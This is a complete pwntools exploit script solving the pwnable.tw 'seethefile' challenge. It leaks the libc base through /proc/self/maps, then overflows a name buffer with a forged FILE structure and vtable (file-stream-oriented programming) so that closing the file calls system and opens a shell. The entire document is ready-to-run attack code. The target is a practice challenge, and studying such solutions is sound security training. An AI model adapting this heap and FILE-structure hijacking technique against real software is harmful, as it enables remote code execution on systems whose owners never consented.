#!/usr/bin/env python3
from pwn import *

PORT = 10200
HOST = "chall.pwnable.tw"
elf = context.binary = ELF('./seethefile_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b*0x08048A73
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

# Stage 1: Leak libc via /proc/self/maps file

def menu(opt):
    p.sendlineafter(b'Your choice :', str(opt).encode())

def open(file):
    menu(1)
    p.sendlineafter(b'want to see :', file)

def read():
    menu(2)

def write():
    menu(3)

def close():
    menu(4)

open(b'/proc/self/maps')
read()
write()
read()
write()

p.recvuntil(b'0 rw-p 00000000 00:00 0 \n')
libc.address = int(p.recvuntil(b'-', drop = True), 16)
log.success(f'libc_base: {libc.address:#x}')
# GDB()
close()

# Stage 2: FSOP

name = 0x0804B260
fp = 0x0804B280
fake_file = name
fake_vtable = name + 0x98

pl = flat({
        0x00: 0xffffdfff,
        0x04: b';sh\x00',
        0x20: fake_file,
        0x94: fake_vtable,
        0x98: 0,
        0x9c: 0,
        0xa0: libc.sym.system
    }, filler = b'\x00')

menu(5)
p.sendlineafter(b'Leave your name :', pl)
p.sendline(b'/home/seethefile/get_flag')
p.sendlineafter(b'Your magic :', b'Give me the flag')

p.interactive()

# d1nhdwc